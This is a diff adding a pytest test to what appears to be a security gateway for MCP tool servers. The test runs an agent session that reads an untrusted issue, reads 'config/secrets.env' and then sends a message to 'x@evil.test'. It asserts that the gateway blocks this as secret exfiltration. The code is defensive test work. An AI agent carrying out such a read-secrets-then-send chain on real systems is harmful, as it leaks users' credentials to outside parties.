@@ -152,3 +152,49 @@ def test_changed_tool_definition_is_quarantined(tmp_path):
     pins.write_text(pins.read_text().replace('"read_file": "', '"read_file": "tampered'))
     assert "read_file" not in run(cfg, names)  # next session: definition "changed"
     assert "tool_definition_changed" in (tmp_path / "state" / "audit.jsonl").read_text()
+
+
+def _free_port():
+    import socket
+    with socket.socket() as s:
+        s.bind(("127.0.0.1", 0))
+        return s.getsockname()[1]
+
+
+def test_remote_http_upstream_shares_the_session_with_a_local_one(tmp_path):
+    import socket
+    import subprocess
+    import time
+    port = _free_port()
+    remote = subprocess.Popen(
+        [sys.executable, "src/servers/github_mock.py"], cwd=ROOT,
+        env={**os.environ, "MCP_TRANSPORT": "streamable-http", "MCP_PORT": str(port),
+             "MCP_DELIVERY_LOG": str(tmp_path / "remote.delivered")},
+        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+    try:
+        for _ in range(100):
+            try:
+                socket.create_connection(("127.0.0.1", port), timeout=0.2).close()
+                break
+            except OSError:
+                time.sleep(0.1)
+        cfg = tmp_path / "gateway.yaml"
+        cfg.write_text(yaml.safe_dump({"state_dir": str(tmp_path / "state"), "servers": {
+            "local": {"command": sys.executable, "args": ["src/servers/github_mock.py"], "cwd": ROOT,
+                      "policy": "mock"},
+            "remote": {"url": f"http://127.0.0.1:{port}/mcp", "policy": "mock"},
+        }}))
+
+        async def script(s):
+            names = {t.name for t in (await s.list_tools()).tools}
+            assert "remote__send_message" in names and "local__get_issue" in names
+            await s.call_tool("local__get_issue", {"number": 2})                      # stdio: untrusted
+            await s.call_tool("remote__read_file", {"path": "config/secrets.env"})    # http: secret
+            return await s.call_tool("remote__send_message", {"to": "x@evil.test", "body": "done"})
+
+        res = run(cfg, script)
+        assert res.isError and "secret-exfiltration" in text(res)
+        assert not (tmp_path / "remote.delivered").exists()
+    finally:
+        remote.terminate()
+        remote.wait(timeout=10)
